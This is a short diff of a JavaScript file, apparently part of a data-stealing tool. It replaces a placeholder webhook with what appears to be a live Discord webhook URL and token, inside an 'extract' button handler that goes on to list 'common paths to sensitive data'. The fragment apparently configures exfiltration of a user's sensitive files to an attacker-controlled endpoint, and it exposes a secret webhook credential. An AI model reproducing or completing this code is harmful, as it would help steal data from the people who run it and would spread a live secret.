@@ -1,6 +1,6 @@
 document.getElementById('extract-btn').addEventListener('click', function() {
     // Webhook URL
-    const WEBHOOK_URL = 'https://your-webhook-url.com';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1388760353772535930/pnZFz1Prz8k7n0K861P_87Jlc__lNawsrYe1YpFCXItj-pwbOLcHU9ggPAgNKxe4Zzle';
 
     // Common paths to sensitive data
     const COMMON_PATHS = [
